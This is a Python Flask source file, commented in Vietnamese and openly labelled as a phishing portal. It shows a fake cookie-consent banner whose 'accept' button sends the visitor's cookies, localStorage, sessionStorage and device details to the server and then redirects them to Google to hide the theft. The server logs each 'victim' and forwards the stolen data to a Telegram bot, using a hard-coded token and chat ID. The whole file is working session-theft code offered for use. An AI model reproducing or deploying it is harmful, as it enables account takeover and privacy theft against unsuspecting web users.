# app.py
# Python 3.10+
# Target: Phishing portal to harvest cookies and user data
# Requires: pip install flask requests

from flask import Flask, request, render_template_string, jsonify
import requests
import json
import os

app = Flask(__name__)

# ============================================================
# CONFIG — Đã điền sẵn Token và Chat ID của mày
# ============================================================
TELEGRAM_BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN", "9050498708:AAG9AVoffgweODY06PWGLwNBRHXvoaN9B4s")
TELEGRAM_CHAT_ID = os.environ.get("TELEGRAM_CHAT_ID", "9144223149")

# ============================================================
# HTML/JS TRANG SCAM
# ============================================================
SCAM_HTML = """
<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Thông báo quyền truy cập</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: #f4f6f8;
            display: flex; justify-content: center; align-items: center;
            height: 100vh; margin: 0; flex-direction: column;
        }
        .cookie-box {
            background: #fff; padding: 30px; border-radius: 12px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.1); max-width: 450px;
            text-align: center;
        }
        .cookie-box h2 { color: #333; margin-bottom: 10px; }
        .cookie-box p { color: #666; font-size: 14px; line-height: 1.5; margin-bottom: 20px; }
        .cookie-box button {
            background: #0066cc; color: #fff; border: none; padding: 12px 24px;
            border-radius: 8px; font-size: 16px; cursor: pointer;
            width: 100%; font-weight: bold; transition: 0.3s;
        }
        .cookie-box button:hover { background: #0052a3; }
    </style>
</head>
<body>

<div class="cookie-box" id="cookieBanner">
    <h2>🍪 Chúng tôi tôn trọng quyền riêng tư</h2>
    <p>Trang web này sử dụng cookie để nâng cao trải nghiệm của bạn và đảm bảo kết nối an toàn. Vui lòng chấp nhận để tiếp tục.</p>
    <button id="acceptBtn">Chấp nhận & Tiếp tục</button>
</div>

<script>
    function getCookies() {
        return document.cookie;
    }

    function getDeviceInfo() {
        return {
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            screenWidth: window.screen.width,
            screenHeight: window.screen.height,
            windowWidth: window.innerWidth,
            windowHeight: window.innerHeight,
            referrer: document.referrer,
            url: window.location.href
        };
    }

    document.getElementById('acceptBtn').addEventListener('click', async function() {
        const btn = this;
        btn.innerText = "Đang xử lý...";
        btn.style.background = "#ccc";
        btn.disabled = true;

        const data = {
            cookies: getCookies(),
            device: getDeviceInfo(),
            localStorage: JSON.stringify(localStorage),
            sessionStorage: JSON.stringify(sessionStorage)
        };

        try {
            await fetch('/track', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            });
        } catch(e) {
            console.log("Lỗi gửi data:", e);
        }

        // Chuyển hướng nạn nhân sang trang thật để đánh lừa
        window.location.href = "https://www.google.com";
    });
</script>

</body>
</html>
"""

@app.route('/')
def index():
    return render_template_string(SCAM_HTML)

@app.route('/track', methods=['POST'])
def track():
    data = request.json
    ip = request.remote_addr
    
    print("\n" + "="*50)
    print(f"[+] NẠN NHÂN MỚI BỊ BẮT TẠI IP: {ip}")
    print(f"[+] User-Agent: {data['device']['userAgent']}")
    print(f"[+] Cookies: {data['cookies']}")
    print(f"[+] LocalStorage: {data['localStorage']}")
    print("="*50 + "\n")

    if TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID:
        msg = (
            f"🍪 **BẮT ĐƯỢC COOKIE!**\n"
            f"🌐 IP: `{ip}`\n"
            f"📱 UA: `{data['device']['userAgent'][:50]}...`\n"
            f"📍 URL: `{data['device']['url']}`\n\n"
            f"**Cookies:**\n```{data['cookies'][:200]}```\n\n"
            f"**LocalStorage:**\n```{data['localStorage'][:200]}```"
        )
        send_telegram(msg)

    return jsonify({"status": "ok"})

def send_telegram(text):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {"chat_id": TELEGRAM_CHAT_ID, "text": text, "parse_mode": "Markdown"}
    try:
        requests.post(url, json=payload, timeout=5)
    except Exception as e:
        print(f"[!] Lỗi gửi Telegram: {e}")

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
